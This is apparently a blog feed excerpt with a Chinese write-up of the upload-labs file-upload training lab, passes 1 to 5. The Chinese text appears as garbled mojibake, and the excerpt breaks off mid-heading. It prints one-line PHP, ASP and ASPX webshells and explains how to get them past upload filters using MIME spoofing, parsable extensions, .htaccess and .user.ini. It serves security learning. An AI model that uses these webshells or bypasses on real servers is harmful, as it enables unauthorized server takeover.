    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¯¥ç³»åˆ—çš„å®éªŒä¸»è¦å›´ç»•åˆ©ç”¨burpsuiteçš„æš´åŠ›ç ´è§£ã€‚æš´åŠ›ç ´è§£ï¼Œæ˜¯æŒ‡é»‘å®¢åˆ©ç”¨å¯†ç å­—å…¸ï¼Œä½¿ç”¨ç©·ä¸¾æ³•çŒœè§£å‡ºç”¨æˆ·å£ä»¤ï¼Œæ˜¯ç°åœ¨æœ€ä¸ºå¹¿æ³›ä½¿ç”¨çš„æ”»å‡»æ‰‹æ³•</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-pass1â€”13</title>
    <link href="http://example.com/2021/02/09/upload-labs-pass1-13/"/>
    <id>http://example.com/2021/02/09/upload-labs-pass1-13/</id>
    <published>2021-02-09T11:32:20.000Z</published>
    <updated>2021-02-24T04:51:36.883Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>upload-labsä¸»è¦æ˜¯ä¸€äº›é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å®éªŒã€‚</p><p>å†æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹<strong>ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿ</strong></p><p><strong>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚å¸¸è§åœºæ™¯æ˜¯webæœåŠ¡å™¨å…è®¸ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡æˆ–è€…æ™®é€šæ–‡æœ¬æ–‡ä»¶ä¿å­˜ï¼Œè€Œç”¨æˆ·ç»•è¿‡ä¸Šä¼ æœºåˆ¶ä¸Šä¼ æ¶æ„ä»£ç å¹¶æ‰§è¡Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚æ˜¾ç„¶è¿™ç§æ¼æ´æ˜¯getshellæœ€å¿«æœ€ç›´æ¥çš„æ–¹æ³•ä¹‹ä¸€ï¼Œéœ€è¦è¯´æ˜çš„æ˜¯ä¸Šä¼ æ–‡ä»¶æ“ä½œæœ¬èº«æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œé—®é¢˜åœ¨äºæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†å’Œè§£é‡Šæ–‡ä»¶ã€‚webåº”ç”¨ç¨‹åºé€šå¸¸å¸¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨åšå®¢å‘è¡¨æ–‡ç« éœ€è¦ä¸Šä¼ å›¾ç‰‡ç­‰è¡Œä¸ºå°±å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æ–‡ä»¶ä¸Šä¼ æ¼æ´å°±æ˜¯åˆ©ç”¨ç½‘é¡µä»£ç ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„å˜é‡è¿‡æ»¤ä¸ä¸¥å°†ï¼Œå°†å¯æ‰§è¡Œçš„æ–‡ä»¶ä¸Šä¼ åˆ°ä¸€ä¸ªåˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡URLå»è®¿é—®ä»¥æ‰§è¡Œæ¶æ„ä»£ç â€”â€”æ”»å‡»è€…å¯ä»¥ç›´æ¥ä¸Šä¼ WebShellï¼ˆä»¥aspã€phpæˆ–è€…jspç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼‰åˆ°æœåŠ¡å™¨ä¸Šã€‚ç„¶ååˆ©ç”¨æ¸—é€å·¥å…·ï¼ˆå¦‚èšå‰‘ï¼‰è¿æ¥webshellä»¥è¾¾åˆ°æ“ä½œæœåŠ¡å™¨çš„ç›®çš„ã€‚</strong></p><ul><li><strong>ä¸Šä¼ æ¼æ´ç±»å‹å¤§ä½“å¯åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</strong></li></ul><p><img src="/upload-labs-pass1/1.png" alt="1"></p><ul><li><p>åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹çš„æ€è·¯ï¼š<img src="/upload-labs-pass1/2.png" alt="2" style="zoom: 200%;"></p></li><li><p><strong>webshellï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰çš„åˆ¶å¤‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¨¡æ¿ï¼š <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>@</code>è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯ï¼Œä¹Ÿä¸æŠ¥é”™ã€‚<code>evalï¼ˆï¼‰</code>å‡½æ•°è¡¨ç¤ºæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆçš„å…¨éƒ½å½“åšä»£ç æ‰§è¡Œã€‚<code>$_POST[&#39;password&#39;]</code>è¡¨ç¤ºä»é¡µé¢ä¸­ç”¨postçš„æ–¹å¼è·å¾—passwordè¿™ä¸ªå‚æ•°å€¼ã€‚</p></li></ul><p>é‚£ä¹ˆè¿™å¥è¯çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼špassword=echo â€˜aâ€™ï¼Œå°±ç›¸å½“äº&lt; ?php @eval(â€œecho â€˜aâ€™â€);? &gt;å³å†ç½‘é¡µä¸Šè¾“å‡ºä¸€ä¸ªaã€‚æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªå°±å¯ä»¥æ ¹æ®æ”¹å˜passwordçš„å€¼æ¥è¾¾åˆ°æ“æ§æœåŠ¡å™¨çš„ç›®çš„äº†ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥è¿æ¥èšå‰‘ï¼Œä¸€é”®è·å–ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p><strong>è¡¥å……ï¼š</strong></p><ul><li><strong>å…¥ä¾µçš„æ¡ä»¶</strong></li></ul><p>ï¼ˆ1ï¼‰æœ¨é©¬ä¸Šä¼ æˆåŠŸï¼Œæœªè¢«æ€ï¼›<br>ï¼ˆ2ï¼‰çŸ¥é“æœ¨é©¬çš„è·¯å¾„åœ¨å“ªï¼›<br>ï¼ˆ3ï¼‰ä¸Šä¼ çš„æœ¨é©¬èƒ½æ­£å¸¸è¿è¡Œã€‚</p><ul><li><p><strong>å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬</strong></p><p>phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt; ?php @eval($_POST[â€˜passâ€™]);? &gt;<br>aspçš„ä¸€å¥è¯æ˜¯ï¼š   &lt;%eval request (â€œpassâ€)%&gt;<br>aspxçš„ä¸€å¥è¯æ˜¯ï¼š  &lt;%@ Page Language=â€Jscriptâ€%&gt; &lt;%eval(Request.Item[â€œpassâ€],â€unsafeâ€);%&gt;</p></li></ul><h1 id="pass-01ï¼šjsæ£€æŸ¥"><a href="#pass-01ï¼šjsæ£€æŸ¥" class="headerlink" title="pass-01ï¼šjsæ£€æŸ¥"></a>pass-01ï¼šjsæ£€æŸ¥</h1><p>æ‰“å¼€pass-01çš„index.phpæŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬çœ‹åˆ°ç½‘é¡µå¯¹ä¸Šä¼ çš„å›¾ç‰‡åšäº†jsæ£€æŸ¥ï¼Œ</p><p><img src="/upload-labs-pass1/3.png" alt="3"></p><p>è€Œä¸”è®¾ç½®äº†ä¸Šä¼ ç™½åå•ï¼Œ<img src="/upload-labs-pass1/4.png" alt="4"></p><p>å› æ­¤é¢˜ç›®è¦æ±‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹ä¸‰ç§æ€è·¯ï¼š</p><ol><li>åˆ é™¤é‚£æ®µæœ‰å…³jsæ£€æŸ¥çš„ä»£ç </li><li>å¢åŠ ç™½åå•ä¸­å¯ä¸Šä¼ æ–‡ä»¶ç±»å‹</li><li>å…ˆå°†ä¸Šä¼ æ–‡ä»¶ç±»å‹æ”¹ä¸ºç™½åå•çš„ä¸€ç§ï¼ˆä½¿å…¶é€šè¿‡jsæ£€æŸ¥ï¼‰ç„¶åç”¨burpæŠ“åŒ…ï¼Œå†å°†å…¶æ–‡ä»¶åç¼€æ›´æ”¹ä¸ºé¢„æœŸæ–‡ä»¶ç±»å‹</li></ol><h1 id="pass-02ï¼šMIMEç»•è¿‡"><a href="#pass-02ï¼šMIMEç»•è¿‡" class="headerlink" title="pass-02ï¼šMIMEç»•è¿‡"></a>pass-02ï¼šMIMEç»•è¿‡</h1><ul><li>æŸ¥çœ‹æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„<strong>MIME</strong>è¿›è¡Œæ£€æŸ¥ã€‚</li></ul><p><strong>MIMEï¼š</strong>MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚åœ¨HTTPä¸­ï¼ŒMIMEç±»å‹è¢«å®šä¹‰åœ¨Content-Type headerä¸­ã€‚</p><p><strong>å¸¸è§çš„MIMEç±»å‹ï¼š</strong></p><p>udio/mpeg -&gt; .mp3<br>application/msword -&gt; .doc<br>application/octet-stream -&gt; .exe<br>application/pdf -&gt; .pdf<br>application/x-javascript -&gt; .js<br>application/x-rar -&gt; .rar<br>application/zip -&gt; .zip<br>image/gif -&gt; .gif<br>image/jpeg -&gt; .jpg / .jpeg<br>image/png -&gt; .png<br>text/plain -&gt; .txt<br>text/html -&gt; .html<br>video/mp4 -&gt; .mp4</p><ul><li><strong>æŸ¥çœ‹æºç ï¼š</strong><img src="/upload-labs-pass1/5.png" alt="5"></li></ul><p>ä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨è¿˜æ˜¯è§„å®šäº†ç™½åå•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹ä¸¤ç§æ€è·¯ï¼š</p><p>1.å…ˆå°†webshellåç¼€ç±»å‹æ”¹ä¸ºå…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€ç±»å‹ï¼ˆä½¿å…¶ç»•è¿‡MIMEæ£€æŸ¥ï¼‰ï¼Œç„¶åburpæŠ“åŒ…ï¼Œå°†webshellåç¼€æ”¹å›.phpã€‚</p><p>2.å°†webshell.phpæ–‡ä»¶ä¸Šä¼ ï¼ŒburpæŠ“åŒ…ï¼Œå°†Content-Typeçš„MIMEç±»å‹æ”¹ä¸ºç™½åå•ä¸­çš„ç±»å‹ã€‚</p><ul><li><strong>spï¼š</strong>æˆ‘åœ¨çœ‹æºç çš„æ—¶å€™å‘ç°è¿™å…³çš„æºç ä¹Ÿå­˜åœ¨jsæ£€æŸ¥çš„æºç ï¼Œä½†æ˜¯æˆ‘å‘ç°æŠŠè¿™æ®µç åˆ äº†å¹¶ä¸èƒ½å®ç°ä¸Šä¼ webshellï¼Œå› ä¸ºæºç ä¸­æ²¡æœ‰è§„å®šcheckfile()çš„ä½œç”¨ï¼Œè€Œä¸”æœåŠ¡å™¨æ˜¯é€šè¿‡ifè¯­å¥åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦ç¬¦åˆã€‚</li></ul><h1 id="pass-03ï¼šä¸Šä¼ ç‰¹æ®Šå¯è§£æåç¼€"><a href="#pass-03ï¼šä¸Šä¼ ç‰¹æ®Šå¯è§£æåç¼€" class="headerlink" title="pass-03ï¼šä¸Šä¼ ç‰¹æ®Šå¯è§£æåç¼€"></a>pass-03ï¼šä¸Šä¼ ç‰¹æ®Šå¯è§£æåç¼€</h1><ul><li>æŸ¥çœ‹æºç ï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶åšäº†å¾ˆå¤šè¿‡æ»¤å¤„ç†ï¼ŒåŒ…æ‹¬è®¾å®šäº†é»‘åå•ã€‚</p><ul><li>è¿™è¾¹æˆ‘ä»¬è¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šApacheè§£æé¡ºåºæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€ï¼Œå¦‚æœæœ€å³ä¾§æ‰©å±•åä¸èƒ½è¯†åˆ«çš„è¯ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚è€Œä¸”Apacheçš„httpd.confä¸­å¯ä»¥è¿›è¡Œé…ç½®ï¼ˆAddType application/x-httpd-php .php .php3 .phtmlï¼‰ï¼Œè§„å®šå“ªäº›æ–‡ä»¶åç¼€æ˜¯ä»¥phpæ ¼å¼æ¥è§£æçš„ã€‚</li></ul><p>â€‹      æˆ‘ä»¬çœ‹åˆ°é»‘åå•ä¸­æ²¡æœ‰ç¦ç”¨è¿™äº›å¯è§£æåç¼€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä¸Šä¼ å¯è§£æåç¼€ã€‚</p><ul><li><p>spï¼šå¸¸ç”¨å¯è§£æåç¼€<img src="/upload-labs-pass1/6.png" alt="6"></p></li><li><p>é™Œç”Ÿå‡½æ•°ï¼š</p></li></ul><p>ï¼strrchr() å‡½æ•°</p><p>åŠŸèƒ½ï¼šæŸ¥æ‰¾å­—ç¬¦ï¼Œåœ¨æŒ‡å®šå­—ç¬¦ä¸²ä¸­ä»åé¢å¼€å§‹çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚</p><p>è¯­æ³•ï¼šstrrchr(stringï¼Œchar)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>string</td><td>å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>char</td><td>å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚å¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…æ•°å­— ASCII å€¼çš„å­—ç¬¦ã€‚</td></tr></tbody></table><p>ï¼trim()å‡½æ•°</p><p>åŠŸèƒ½ï¼šé™¤å»<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2/1017763">å­—ç¬¦ä¸²</a>å¼€å¤´å’Œæœ«å°¾çš„ç©ºæ ¼æˆ–å…¶ä»–å­—ç¬¦ã€‚</p><p>è¯­æ³•ï¼štrim (string $str [,string $charlist ])</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>charlist</em></td><td>å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼šâ€\0â€ - NULL ï¼›â€\tâ€ - åˆ¶è¡¨ç¬¦ï¼› â€œ\nâ€ - æ¢è¡Œï¼› â€œ\x0Bâ€ - å‚ç›´åˆ¶è¡¨ç¬¦ï¼› â€œ\râ€ - å›è½¦ ï¼›â€ â€œ - ç©ºæ ¼</td></tr></tbody></table><p>ï¼in_array()å‡½æ•°</p><p>åŠŸèƒ½ï¼šæœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p><p>è¯­æ³•ï¼šin_array(search,array,type)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>search</em></td><td>å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td><em>array</em></td><td>å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td><em>type</em></td><td>å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” <em>type</em> å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</td></tr></tbody></table><p>ï¼move_uploaded_file() å‡½æ•°</p><p>åŠŸèƒ½ï¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚</p><p>è¯­æ³•ï¼šmove_uploaded_file(file,newloc)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>file</td><td>å¿…éœ€ã€‚è§„å®šè¦ç§»åŠ¨çš„æ–‡ä»¶ã€‚</td></tr><tr><td>newloc</td><td>å¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚</td></tr></tbody></table><ul><li>æ³¨ï¼šè¿™å…³æˆ‘æ²¡èƒ½å®ç°åœ¨æœ¬åœ°å¤ç°ï¼Œä¸Šä¼ shellåç”¨èšå‰‘è¿æ¥ä¸ä¸Šï¼Œå¥½åƒæ˜¯Apacheçš„ç‰ˆæœ¬ä¸èƒ½å¤ªé«˜ã€‚</li></ul><p>ï¼str_ireplace() å‡½æ•°</p><p>åŠŸèƒ½ï¼šæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><p>è¯­æ³•ï¼šstr_ireplace(find,replace,string,count)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>find</em></td><td>å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚</td></tr><tr><td><em>replace</em></td><td>å¿…éœ€ã€‚è§„å®šæ›¿æ¢ <em>find</em> ä¸­çš„å€¼çš„å€¼ã€‚</td></tr><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>count</em></td><td>å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚</td></tr></tbody></table><h1 id="pass-04ï¼šä¸Šä¼ -htaccess"><a href="#pass-04ï¼šä¸Šä¼ -htaccess" class="headerlink" title="pass-04ï¼šä¸Šä¼ .htaccess"></a>pass-04ï¼šä¸Šä¼ .htaccess</h1><ul><li>è¿™å…³çš„é»‘åå•æ·»åŠ äº†å¯è§£æåç¼€ï¼Œä½†æ˜¯å¿½ç•¥äº†.htaccessç±»å‹ã€‚</li></ul><p>htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹ç½‘é¡µé…ç½®ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ç½‘é¡µ301é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åç­‰åŠŸèƒ½ã€‚å…¶ä¸­.htaccessæ–‡ä»¶å†…å®¹:SetHandler application/x-httpd-phpè®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨PHPè§£æï¼Œæ— è®ºä¸Šä¼ ä»»ä½•ç±»å‹æ–‡ä»¶ï¼Œåªè¦æ–‡ä»¶å†…å®¹ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚</p><ul><li>å› æ­¤è¿™å…³çš„æ€è·¯æ˜¯ï¼šå…ˆä¸Šä¼ ä¸€ä¸ªåç¼€ä¸º.htaccessï¼Œå†…å®¹ä¸ºï¼šSetHandler application/x-httpd-php</li></ul><p>â€‹           &lt;FilesMatch â€œwebshell.jpgâ€&gt;                   </p><p>æˆ–ã€€ã€€                 SetHandler application/x-httpd-php         çš„æ–‡ä»¶ï¼Œç„¶åå†ä¸Šä¼ webshell.jpgå³å¯ã€‚</p><p>â€‹            </p><ul><li>æ³¨ï¼šè¿™å…³æˆ‘æ²¡èƒ½å®ç°åœ¨æœ¬åœ°å¤ç°ï¼Œä¸Šä¼ shellåç”¨èšå‰‘è¿æ¥ä¸ä¸Šï¼Œå¥½åƒæ˜¯Apacheçš„ç‰ˆæœ¬ä¸èƒ½å¤ªé«˜ã€‚</li></ul><h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><ul><li>pass-04æ˜¯åˆ©ç”¨Apacheçš„è§£ææ–‡ä»¶è¿›è¡Œç»•è¿‡é»‘åå•ï¼Œè¿™å…³åˆ™æ˜¯åˆ©ç”¨PHPçš„è§£ææ–¹å¼ç»•è¿‡é»‘åå•ã€‚</li></ul><p>æˆ‘ä»¬çœ‹åˆ°é»‘åå•é‡Œåˆå¤šåŠ äº†ä¸€ä¸ªhtaccessç±»å‹ï¼Œä½†æ˜¯phpé…ç½®æ–‡ä»¶ç±»å‹php.iniæ²¡æœ‰è¢«ç¦ç”¨ï¼Œä¸”æç¤ºå‘Šè¯‰æˆ‘ä»¬ä¸Šä¼ ç›®å½•å­˜åœ¨phpæ–‡ä»¶ï¼ˆreadme.phpï¼‰ã€‚ </p><ul><li>é‚£ä¹ˆè¿™å…³çš„æ€è·¯ï¼šå…ˆä¸Šä¼ ä¸€ä¸ªåç¼€ä¸º.user.iniï¼ˆç›¸å½“äºç”¨æˆ·è‡ªå®šä¹‰çš„php.iniï¼‰å†…å®¹ä¸º auto_prepend_file=webshell.pngï¼ˆæ„æ€æ˜¯è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰phpæ–‡ä»¶éƒ½åŒ…å«webshell.pngï¼‰ï¼Œç„¶åæˆ‘ä»¬å†ä¸Šä¼ webshell.pngï¼Œæœ€åç”¨èšå‰‘è¿æ¥æ—¶æˆ‘ä»¬è¦æ³¨æ„è¿æ¥çš„æ˜¯readme.phpï¼ˆå› ä¸ºå…¶æ–‡ä»¶å†…å®¹åŒ…å«shellï¼‰è€Œä¸æ˜¯webshell.pngã€‚</li></ul><p>ä½†æ˜¯è¿™é‡Œæˆ‘å…¶å®æœ‰ä¸ªç–‘é—®ï¼šé‚£å°±æ˜¯æˆ‘ä»¬åœ¨ç°å®æ¸—é€çš„æ—¶å€™åˆæ€ä¹ˆä¼šçŸ¥é“é¶æœºçš„ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨.phpç±»å‹æ–‡ä»¶ï¼Œä»¥åŠ.phpæ–‡ä»¶çš„æ–‡ä»¶åå‘¢ï¼ŸæŒ–ä¸ªå‘ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p><h1 id="pass-06ï¼šåç¼€å¤§å°å†™ç»•è¿‡"><a href="#pass-06ï¼šåç¼€å¤§å°å†™ç»•è¿‡" class="headerlink" 